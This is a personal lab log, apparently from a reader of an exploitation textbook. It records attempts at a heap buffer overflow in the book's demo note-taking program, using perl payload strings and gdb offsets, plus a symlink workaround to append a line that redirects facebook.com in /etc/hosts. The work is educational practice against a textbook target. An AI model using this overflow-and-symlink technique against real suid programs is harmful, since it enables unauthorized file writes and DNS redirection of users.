title: AoE log entry 3
---

So, last time we were trying to use a heap-based buffer overflow to overwrite the filename that simplenote.c writes too. The same string we overflow the buffer with will be written into that file. simplenote.c appends to the file, so this exploit should be useful for adding a line to a file you're not really supposed to write to.

Mind you, simplenote.c is the single-user version of AoE's notetaking demo program, so it isn't an suid binary, and you can't write to anything you wouldn't already have write access to. However, the book has a multi-user suid version, notetaker.c, that has the same vulnerability (spoiler, I looked ahead). What I learn here can be applied there for great mayhem.

How I think it'll work:
`./simplenote <100+ characters of stuff><file/path>`
This appends `<100+ chars of stuff><filepath>` to `file/path`. Depending on what you're writing to and whether it can tolerate a filename at the end of the line, you could put the appropriate comment delimiter at the end of the chars of stuff. e.g.
`./simplenote 'sketchy.ip.address www.facebook.com # <random junk padding to overflow> /etc/hosts'`

The trick here is to pad just enough to align /etc/hosts with the datafile buffer on the heap.

So we were approximately here:
```
(gdb) p buffer
$3 = 0x555555757010 'A' <repeats 200 times>...
(gdb) p datafile
$4 = 0x555555757080 'A' <repeats 152 times>
```
I wondered why there are 200 A's in buffer and 152 in datafile, when buffer should be 100 bytes long. I think I figured it out. The `...` means there are more than 200 A's. Perhaps gdb only mentions the first 200. If you look at the last two digits of the addresses, you'll see they're definitelymore than 48 bytes apart.
```
(gdb) p $4 - $3
$5 = 112
```
You'll note 112 = 7*16. 0x80 - 0x10 = 0x70 = 7*16.
So I gotta construct a 112-long string. `sketchy.ip.address www.facebook.com # ` is 39 characters. 112 - 39 = 73.
```
echo 'sketchy.ip.address www.facebook.com # ' | wc -c -
39 -
./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x73 . "/etc/hosts/"')"
[DEBUG] buffer   @ 0x55734621a010: 'sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/etc/hosts/'
[DEBUG] datafile @ 0x55734621a080: 'etc/hosts/'
[!!] Fatal Error in main() while opening file: No such file or directory
```
Whoops. Off by one error. But that doesn't seem right... Did I get the length of my sketchy ip string wrong?
```
./a.out $(perl -e 'print "A"x112')
[DEBUG] buffer   @ 0x55829d007010: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[DEBUG] datafile @ 0x55829d007080: ''
```
See, writing 112 chars wipes out the datafile with the null terminator. So whatever comes after those 112 chars should be written to datafile. Hrm.

```
./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x73')"
[DEBUG] buffer   @ 0x5626d4370010: 'sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[DEBUG] datafile @ 0x5626d4370080: '/tmp/notes'
[!!] Fatal Error in main() while opening file: No such file or directory
```
Now the filename is intact but it thinks the file doesn't exist??? (I checked, the file does exist.) Let's look at it with gdb.
So, with 73 A's, we have A's and then a null terminator up until 0x...80 (address of datafile string), and /tmp/notes at 0x...80. Not clear why it thinks the file doesn't exist, because if I give it 72 A's, it writes to the file fine, and neither of those overwrite the datafile string. Note: I still get free/heap errors with 72 A's and a successful write. When I give it 74 A's, the first character of the datafile string is overwritten with a null terminator. So I'll have to figure out where my math doesn't add up...

Counting in memory how many chars are occupied by my pre-A's string, I get 38. So perhaps the issue is with using wc to get the string length.
```
rad@VPRSTN:~/codes/artofexp$ echo "sketchy.ip.address www.facebook.com # " | wc -c -
39 -
rad@VPRSTN:~/codes/artofexp$ perl -e 'print "sketchy.ip.address www.facebook.com # "' | wc -c -
38 -
```
...Well then. Does echo add a newline? `man echo` Yes, yes it does. I would have to use `echo -n`. Gonna stick with perl from now on, since I have to use it for generating A's anyway.
Back to business:
```
./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x74 . "/etc/hosts"')"
[DEBUG] buffer   @ 0x5586037e6010: 'sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/etc/hosts'
[DEBUG] datafile @ 0x5586037e6080: '/etc/hosts'
[!!] Fatal Error in main() while opening file: Permission denied
```
No surprise, permission denied. For proof of concept, we'll use sudo real quick, but then we'll try this on an suid binary.
...Hmm. It claims to have saved the note to /etc/hosts, but the hosts file is unchanged. Let's see if we can write to a less special file, /tmp/hosts.
```
touch /tmp/hosts
./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x74 . "/tmp/hosts"')"
[DEBUG] buffer   @ 0x556b53e02010: 'sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hosts'
[DEBUG] datafile @ 0x556b53e02080: '/tmp/hosts'
[!!] Fatal Error in main() while opening file: Permission denied
```
Whyyyy. My user owns a.out and /tmp/hosts and has write access to /tmp/hosts. Let's try overwriting the filename with the original filename, /tmp/notes. ...No dice. Nothing added to the file. Does the write not actually happen when the write call is made, and the heap/free errors somehow prevent the write? ???

Let's go back to the source code. We have
```
strcpy(buffer, argv[1]);
...
strncat(buffer, \n, 1);
```
Aha, maybe newline at the end of the filename is a problem. ...Except the program doesn't get any errors back from open, write, or close. Ohoho. BUT. Check this out.
```

IT IS MAKING NEW FILES WITH NAME+NEWLINE. Okay, gotta get around that somehow.
`man strncat`
strncat overwrites the terminating nullbyte of the dest string with the first character of the src string, then null-terminates dest+src. Hmm. So I can't just add a null byte to the end of my exploit string.
Idea: symlink one of these files with newlines in the name to the file I actually want to write to. This requires that you can do other stuff on the box, aren't just feeding a string to the program from somewhere. Well, it's worth a try.

When you create a symlink, the link name can't exist, so I can't just link one of my existing newliney files to /etc/hosts.
`ln -s /etc/hosts /tmp/test\n` creates a file called testn.
`ln -s /etc/hosts /tmp/test\\n` creates a file called test\n.
This all makes sense, didn't expect \n to create ACSII '\n' (0x0A) but it was good to confirm. However, I can use perl to print byte values. But when I try to print a newline into the link name, it just prints an actual newline. Hmm. Maybe have to write a little C program to create this link.

First attempt (sans includes, main signature):
`system("ln -s /etc/hosts /tmp/test\n");`
Nope. Creates /tmp/test, no newline. (Aside: wtf am I doing? Is this a transferrable skill? Creating filenames that include unprintable characters? Specifically symlink names, since my attempts to exploit simplenote.c have already successfully created filenames with unprintable characters. Another approach would be to somehow turn existing files into symlinks.)

Actually, gonna try that, making symlinks from existing files, because I suspect no matter how I construct the string I pass to system(), it'll say lick my ass to my newline. Since they're all character arrays, and I already passed it a character array with a newline at the end. Time to inspect the options to ln more thoroughly.

Looks like -f is the option I want:
```
       -f, --force
              remove existing destination files
```
Testing:
```
ln -s /etc/hosts /tmp/hosts
ln -sf /etc/hosts /tmp/hosts
```
Aha! No 'file exists' error.
Fun find:
```
ln -s /etc/hosts /tmp/hosts? 
ln: failed to create symbolic link '/tmp/hosts'$'\n': File exists
```
Maybe I can print unprintable characters in the shell using $'<escape sequence>'. But it seems I can also conveniently refer to that file using a question mark at the end.
```
ln -sf /etc/hosts /tmp/hosts? 
ln: cannot remove '/tmp/hosts'$'\n': Operation not permitted
```
??? Oh, owned by root. Must've been created the one time I tried with sudo. Let's try with /tmp/notes?, owned by rad.
```
ln -sf /etc/hosts /tmp/notes?
ls -l /tmp/notes?
lrwxrwxrwx 1 rad rad 10 Sep 16 23:17 /tmp/notes? -> /etc/hosts
```
BAM! How's that for a workaround?
```
sudo ./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x74 . "/tmp/notes"')"

[DEBUG] datafile @ 0x55c2e1a56080: '/tmp/notes'
[!!] Fatal Error in main() while opening file: Permission denied
```
Denied... even with sudo. Well, let's try it with a less protected file than /etc/hosts. /tmp/hosts, your time to shine.
```
ln -sf /tmp/hosts /tmp/notes?
ls -l /tmp/notes?
lrwxrwxrwx 1 rad rad 10 Sep 16 23:23 /tmp/notes? -> /tmp/hosts
/a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x74 . "/tmp/notes"')"
[DEBUG] buffer   @ 0x55767016b010: 'sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/notes'
[DEBUG] datafile @ 0x55767016b080: '/tmp/notes'
[!!] Fatal Error in main() while opening file: Permission denied
```
Whyyyy? How does open() deal with symlinks? `man 2 open`
```
       O_NOFOLLOW
              If pathname is a symbolic link, then the open fails, with
              the error ELOOP.  Symbolic links in earlier components of
              the  pathname  will  still  be  followed.  (Note that the
              ELOOP error that can occur in this case is indistinguish‐
              able  from the case where an open fails because there are
              too many symbolic links found while resolving  components
              in the prefix part of the pathname.)

```
O_NOFOLLOW isn't set in simplenote.c, so the symlink should be followed... The "permission denied" error above comes from a call to perror(), which prints a string ("[!!] Fatal Error in main() while opening file") plus info about the last error encountered during a call to a system to library function. If the info is "permission denied", I'm guessing the error was EACCESS.

Hrmmmm....... Let's try with a non-symlink target again.
`./a.out "$(perl -e 'print "sketchy.ip.address www.facebook.com # " . "A"x74 . "/tmp/test"')"`
Note successfully saved, apparently. Let's see what's in /tmp/test?.
```
cat /tmp/test?
sketchy.ip.address www.facebook.com # AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/test
```
Okay, so it's something to do with the symlink. I dunno, man.
